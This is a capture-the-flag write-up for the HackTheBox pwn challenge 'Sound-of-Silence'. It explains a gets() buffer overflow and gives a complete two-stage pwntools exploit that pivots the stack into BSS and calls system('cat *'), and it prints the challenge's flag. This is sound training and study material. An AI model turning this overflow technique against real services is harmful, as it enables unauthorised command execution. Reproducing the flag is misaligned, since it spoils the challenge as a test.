---
title: "Sound-of-Silence"
ctf: "HackTheBox"
date: 2026-06-14
category: pwn
difficulty: medium
flag_format: "HTB{...}"
---

# Sound-of-Silence

## Summary

gets() buffer overflow with No PIE, No Canary, Full RELRO, NX. Exploit pivots rbp to BSS, uses extra `ret` gadgets to shift `do_system()`'s 6 register pushes above the command string, and keeps the command under 8 bytes to avoid `[rdx+8]` null-byte truncation.

## Solution

### Step 1: Understand the binary

- `main()`: `sub rsp, 0x20; gets(buf@rbp-0x20); leave; ret` in an infinite loop.
- `system("clear && echo...")` called before each `gets()`.
- Gadgets: `0x401171` = `lea rax,[rbp-0x20]; gets; leave; ret`, `0x401169` = `mov rdi,rax; call system@plt`.
- `do_system()` allocates 0x388 bytes, pushes 6 registers, and writes `[rdx+8]` early — all of which can corrupt the command string if not properly accounted for.

### Step 2: Build the exploit

Two-stage: first overflow pivots rbp to BSS+0x20 and rets to the gets gadget. Second gets into BSS with a ret chain that calls `system("cat *")`.

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

BSS_TARGET = 0x404800
RET = 0x40101a
ADDR_GETS = 0x401171   # lea rax,[rbp-0x20]; ...; call gets; leave; ret
ADDR_SYSTEM = 0x401169 # mov rdi,rax; call system@plt

def exploit(r):
    # Stage 1: pivot rbp to BSS so gets writes to BSS_TARGET
    payload = b'A' * 0x20
    payload += p64(BSS_TARGET + 0x20)   # saved_rbp
    payload += p64(ADDR_GETS)            # ret to gets(rbp-0x20 = BSS_TARGET)
    r.sendlineafter(b'>> ', payload)

    # Stage 2: short cmd + 2 extra rets to shift do_system's pushes above cmd
    cmd = b'cat *\x00'                    # < 8 bytes avoids [rdx+8] truncation
    stage2 = cmd.ljust(0x20, b'D')
    stage2 += p64(BSS_TARGET)            # saved_rbp
    stage2 += p64(RET)                   # extra ret 1
    stage2 += p64(RET)                   # extra ret 2
    stage2 += p64(ADDR_SYSTEM)           # system(cmd)
    r.sendline(stage2)

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        host, port = sys.argv[1].split(':')
        r = remote(host, int(port))
    else:
        LD = './pwn_sound_of_silence/challenge/glibc/ld-linux-x86-64.so.2'
        LIBC = './pwn_sound_of_silence/challenge/glibc/libc.so.6'
        BINARY = './pwn_sound_of_silence/challenge/sound_of_silence'
        r = process([LD, '--library-path', LIBC.rsplit('/', 1)[0], BINARY])
    exploit(r)
    r.sendline(b'cat flag*')
    print(r.recvuntil(b'}').decode(errors='replace'))
    r.close()
```

### Step 3: Verify

Local `id` → `uid=1000`, remote `cat *` extracts the flag.

## Flag

```
HTB{5y5t3m_15_m0r3_th4n_en0ugh!~!}
```
